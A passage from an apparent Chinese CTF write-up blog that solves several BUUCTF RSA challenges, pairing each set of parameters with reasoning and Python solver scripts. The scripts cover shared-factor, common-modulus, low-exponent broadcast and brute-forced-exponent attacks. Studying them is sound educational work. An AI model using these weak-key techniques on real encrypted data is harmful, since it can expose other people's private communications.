q</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>爆破e</strong>:因为m2已知，且与m1共用e</p><p>这里注意用<strong>加密方式爆破</strong>（$c = m^{e} \mod n$)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(m2, e, n2) == c2:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line">n2 = <span class="number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span></span><br><span class="line">q = gcd(n1, n2)</span><br><span class="line">p1 = n1 // q</span><br><span class="line">p2 = n2 // q</span><br><span class="line">m2 = <span class="string">&quot;BJD&quot;</span> * <span class="number">32</span></span><br><span class="line">m2 = bytes_to_long(m2.encode())</span><br><span class="line">c2 = <span class="number">979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破e</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;for e in range(100000):</span></span><br><span class="line"><span class="string">    if pow(m2, e, n2) == c2:</span></span><br><span class="line"><span class="string">        print(e)</span></span><br><span class="line"><span class="string">        # 52361</span></span><br><span class="line"><span class="string">        break&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">52361</span></span><br><span class="line">c1 = <span class="number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span></span><br><span class="line">phi1 = (p1-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d1 = <span class="built_in">int</span>(gmpy2.invert(e, phi1))</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m1))</span><br></pre></td></tr></table></figure><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>BUUCTF平台前缀统一为flag,记得<strong>改格式</strong>。</p><h2 id="BJDCTF2020-rsa-output"><a href="#BJDCTF2020-rsa-output" class="headerlink" title="[BJDCTF2020]rsa_output"></a>[BJDCTF2020]rsa_output</h2><h3 id="题目-14"><a href="#题目-14" class="headerlink" title="题目"></a>题目</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111,2767&#125;</span><br><span class="line"></span><br><span class="line">&#123;21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111,3659&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">message1</span>=20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span><br><span class="line"></span><br><span class="line"><span class="attribute">message2</span>=11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span><br></pre></td></tr></table></figure><h3 id="题解-13"><a href="#题解-13" class="headerlink" title="题解"></a>题解</h3><ul><li><p>翻译一下题目</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">n</span> = <span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span></span><br><span class="line"><span class="attr">e1</span> = <span class="number">2767</span></span><br><span class="line"><span class="attr">e2</span> = <span class="number">3659</span></span><br><span class="line"><span class="attr">c1</span> = <span class="number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span></span><br><span class="line"><span class="attr">c2</span> = <span class="number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span></span><br></pre></td></tr></table></figure></li><li><p>不难发现，考查<strong>共模攻击</strong></p></li></ul><h4 id="代码-13"><a href="#代码-13" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span></span><br><span class="line">n = <span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span></span><br><span class="line">e1 = <span class="number">2767</span></span><br><span class="line">c2 = <span class="number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span></span><br><span class="line">e2 = <span class="number">3659</span></span><br><span class="line"></span><br><span class="line">s, s1, s2 = gmpy2.gcdext(e1, e2)  <span class="comment"># s为gcd(e1, e2)</span></span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h2 id="RSA4"><a href="#RSA4" class="headerlink" title="RSA4"></a>RSA4</h2><h3 id="题目-15"><a href="#题目-15" class="headerlink" title="题目"></a>题目</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">N</span> = <span class="number">331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004</span> </span><br><span class="line"><span class="attr">c</span> = <span class="number">310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span></span><br><span class="line"></span><br><span class="line"><span class="attr">N</span> = <span class="number">302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114</span> </span><br><span class="line"><span class="attr">c</span> = <span class="number">112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span></span><br><span class="line"></span><br><span class="line"><span class="attr">N</span> = <span class="number">332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323</span> </span><br><span class="line"><span class="attr">c</span> = <span class="number">10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span></span><br></pre></td></tr></table></figure><h2 id="题解-14"><a href="#题解-14" class="headerlink" title="题解"></a>题解</h2><p>校内CTF平台同款的密码题</p><p>当时折磨了我一两周 ：  ）</p><ul><li><p><strong>五进制</strong>：N、c数字很有特点，各位数都<strong>不超过5</strong></p></li><li><p><strong>低加密指数广播攻击</strong>：</p><ul><li>判断在于许多N、c；</li><li>未给e(尝试<strong>e=3</strong></li></ul></li></ul><h4 id="代码-14"><a href="#代码-14" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="keyword">assert</span>(reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line">e= <span class="number">3</span></span><br><span class="line">n= [<span class="number">331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004</span>, <span class="number">302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114</span>, <span class="number">332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323</span>]</span><br><span class="line">c= [<span class="number">310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span>, <span class="number">112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span>, <span class="number">10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#  五进制转十进制</span></span><br><span class="line">n1 = []</span><br><span class="line">c1 = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> n:</span><br><span class="line">    n1.append(<span class="built_in">int</span>(<span class="built_in">str</span>(each), <span class="number">5</span>))</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> c:</span><br><span class="line">    c1.append(<span class="built_in">int</span>(<span class="built_in">str</span>(each), <span class="number">5</span>))</span><br><span class="line">n = n1</span><br><span class="line">c = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用中国剩余定理求解</span></span><br><span class="line">m = gmpy2.iroot(CRT(n, c), e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><ul><li>学会对现有题型的利用，识别新题目中的老考点</li><li>猜测中，<strong>e往往不是65537就很可能是3</strong></li></ul><h2 id="WUSTCTF2020-babyrsa"><a href="#WUSTCTF2020-babyrsa" class="headerlink" title="[WUSTCTF2020]babyrsa"></a>[WUSTCTF2020]babyrsa</h2><h3 id="题目-16"><a href="#题目-16" class="headerlink" title="题目"></a>题目</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">c</span> = <span class="number">28767758880940662779934612526152562406674613203406706867456395986985664083182</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span></span><br><span class="line"><span class="attr">e</span> = <span class="number">65537</span></span><br></pre></td></tr></table></figure><h3 id="题解-15"><a href="#题解-15" class="headerlink" title="题解"></a>题解</h3><p>没什么特殊的常规题。</p><h4 id="代码-15"><a href="#代码-15" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2, libnum</span><br><span class="line">c = <span class="number">28767758880940662779934612526152562406674613203406706867456395986985664083182</span></span><br><span class="line">n = <span class="number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">189239861511125143212536989589123569301</span></span><br><span class="line">q = <span class="number">386123125371923651191219869811293586459</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m = gmpy2.powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-BabyRSA"><a href="#GWCTF-2019-BabyRSA" class="headerlink" title="[GWCTF 2019]BabyRSA"></a>[GWCTF 2019]BabyRSA</h2><h3 id="题目-17"><a href="#题目-17" class="headerlink" title="题目"></a>题目</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">secret</span><br><span class="line">N=<span class="number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span></span><br><span class="line">m1=<span class="number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span></span><br><span class="line">m2=<span class="number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encrypt.txt</span><br><span class="line">import hashlib</span><br><span class="line">import sympy</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;GWHT&#123;******&#125;&#x27;</span></span><br><span class="line">secret = <span class="string">&#x27;******&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">assert</span>(<span class="built_in">len</span>(flag) == <span class="number">38</span>)</span><br><span class="line"></span><br><span class="line">half = <span class="built_in">len</span>(flag) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag1 = flag[:half]</span><br><span class="line">flag2 = flag[half:]</span><br><span class="line"></span><br><span class="line">secret_num = getPrime(<span class="number">1024</span>) * bytes_to_long(secret)</span><br><span class="line"></span><br><span class="line">p = sympy.nextprime(secret_num)</span><br><span class="line">q = sympy.nextprime(p)</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">F1 = bytes_to_long(flag1)</span><br><span class="line">F2 = bytes_to_long(flag2)</span><br><span class="line"></span><br><span class="line">c1 = F1 + F2</span><br><span class="line">c2 = <span class="built_in">pow</span>(F1, <span class="number">3</span>) + <span class="built_in">pow</span>(F2, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">assert</span>(c2 &lt; N)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, e, N)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">output</span> = <span class="built_in">open</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">output</span>.<span class="built_in">write</span>(<span class="string">&#x27;N=&#x27;</span> + str(N) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">output</span>.<span class="built_in">write</span>(<span class="string">&#x27;m1=&#x27;</span> + str(m1) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">output</span>.<span class="built_in">write</span>(<span class="string">&#x27;m2=&#x27;</span> + str(m2) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">output</span>.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><h3 id="题解-16"><a href="#题解-16" class="headerlink" title="题解"></a>题解</h3><p>乍一看，有些头大，仔细琢磨，没有绝对难度</p><p>首先，理一下题目操作</p><ul><li><p>把flag平分为F1、F2</p></li><li><p>$ c1 = F1 + F2$</p><p>$c2 = F1^{3} + F2^{3}$</p></li><li><p>其后，一个让人疑惑的操作</p><p>$ m1 = c1^{e} \mod N$</p><p>$ m2 = c2^{e} \mod N$</p><ul><li><p>因为通常，RSA算法算法中，加解密方程为：</p><p>$c = m^{e} \mod n$</p><p>$m = c^{d} \mod n$</p><p>故，这里的操作具有迷惑性。</p><p>但，我们的目标是明确的，就是想办法<strong>求出c1、c2</strong>，再通c1、c2想办法<strong>求出F1、F2</strong></p><ul><li><strong>求解c1、c2</strong></li></ul><p>这里，我的想法💡是：</p><p>把 m1 记作 C1, c1 记作 M1;</p><p>把 m2 记作 C2, c2 记作 M2.</p><p>则，有：</p><p>$ C1 = M1^{e} \mod N$</p><p>$ C2 = M2^{e} \mod N$</p><p>这样，就顺眼了，只是常规的求明文m</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">n</span> = <span class="number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span></span><br><span class="line"><span class="attribute">p</span> = <span class="number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699</span></span><br><span class="line"><span class="attribute">q</span> = n // p</span><br><span class="line"><span class="attribute">phi</span> = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="attribute">e</span> = <span class="number">65537</span></span><br><span class="line"><span class="attribute">C1</span>=<span class="number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span></span><br><span class="line"><span class="attribute">C2</span>=<span class="number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span></span><br><span 